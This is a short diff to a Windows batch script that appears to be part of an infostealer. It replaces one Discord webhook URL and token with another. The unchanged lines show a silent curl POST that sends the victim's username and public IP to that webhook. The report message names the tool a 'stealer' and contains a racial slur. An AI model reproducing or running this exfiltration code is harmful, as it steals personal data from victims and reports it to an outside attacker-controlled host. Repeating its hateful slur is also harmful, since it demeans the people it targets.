@@ -4,7 +4,7 @@ set "vpath=C:\ProgramData"
 
 cd %vpath%
 
-set "webhook=https://discord.com/api/webhooks/1065937452260413451/V8ROx7fP6e8vXaPHQOkZ98ImykBFW5aMx0_LEKaEjAy36cJQkJobVBNtcgcHEcZC6u1V"
+set "webhook=https://discord.com/api/webhooks/1098881319649427497/6kcKBnGyhQSyT6WmREqxG810VbFIONOwc_fyhfHAie6w7fRRuW3uz7caSu2xkdQsJDth"
 
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %PublicIP% - Nigger stealer]```\"}"  %webhook%
 
